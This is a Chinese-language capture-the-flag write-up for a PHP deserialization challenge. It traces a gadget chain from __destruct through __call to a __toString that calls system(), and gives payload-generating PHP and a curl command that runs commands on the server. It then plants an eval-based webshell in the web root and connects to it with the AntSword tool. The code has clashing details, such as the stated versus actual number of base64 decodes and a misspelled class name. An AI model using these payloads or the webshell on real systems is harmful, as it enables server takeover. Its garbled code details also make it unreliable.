2.利用链分析
	入口:
		`function best64_decode($str){`
			`return base64_decode(base64_decode(base64_decode(base64_decode($str))));`
		`}`
		`......`
		`if(file_exits($_GET['filename'])){`
			`echo"Focus on the previous step!<br>";`
		`}else{`
			`$data=substr($_GET['filename',0,-4]);
			`unserialize(base64_decode($data));`
		`}`
	filename参数经过`substr($filename,0,-4)`去掉末尾4个字符，在经过`best64_decode()`(连续5次base64解码)后反序列化
	所以payload需连接base64编码5次，并附加4个字符
	触发点:
		`class yestarday{`
			`......`
			`public function __destruct(){`
				`echo "You studied hard yesterday.<br>";`
				`return $this->study->hard();`
			`}`
		`}`
		`class today{`
			`public $doing;`
			`......`
			`public function __call($arg1,$arg2){`
				`$this->done="And what you've done has given a choice .<br>";`
				`......`
				`if(md5(md5($this->doing))==666){`
					`return $this->doing();`
				`}else{`
					`return $this->doing->better;`
				`}`
			`}`
		`}`
		`class future{`
			`......`
			`public function __toString(){`
				`echo "This is your future.<br>";`
				`system($_POST["wow"]);`
				`return "win";`
			`}`
			`......`
		`}`
	反序列化后，yesterday对象销毁时触发`__destruct()`,其中调用`$this->study->hard()`
	若将`study`设为`today`对象，而today没有hard方法，则触发`today::__call('hard')`
	在`__call()`中，`if(md5(md5($this->doing))==666)`会对`$this->doing`进行MD5计算。若`$this->doing`是future对象，则`md5($this->doing)`会将其自动转为字符串，触发`future::__toString()`
	`future::__toString`中执行`system($POST["wow"])`因此可通过POST 参数wow执行系统命令
3.payload利用
	如:
		`<?php`
			`class yesterday{`
				`public $study;`
			`}`
			`class today{`
				`public $doing;`
			`}`
			`class future{`
			`}`
			`$future=new future();`
			`$today=new today();`
			`$today->doing=$future;`
			`$yesterday=new yesterday();`
			`$yesterday->study=$today;`
			`$payload=serialize($yesterday);`
			`echo $payload`
		`?>`   -->保存为1.php
	用php 1.php生成序列化后的代码，编码base64()5次，直接用网页后`?filename=......+xxxx`访问
	可以发现网页回应了，要生成flag,用curl
		`curl -X POST -d "wow=cat /flag" "http://  /class.php?filename=......+xxxx"`
4.高阶用法：蚁剑连接
	一句话木马:`<?php eval($_POST["cmd"]);?>`转化为base64,放到下面代码里面
		`curl -X POST -d "wow=echo '转化完后的base64代码' | base64 -d > /var/www/html/shell.php" "http://  /class.php?filename=......+xxxx"`
	打开蚁剑:url:http://  /shell.php
	密码:cmd
	就可以使用虚拟终端
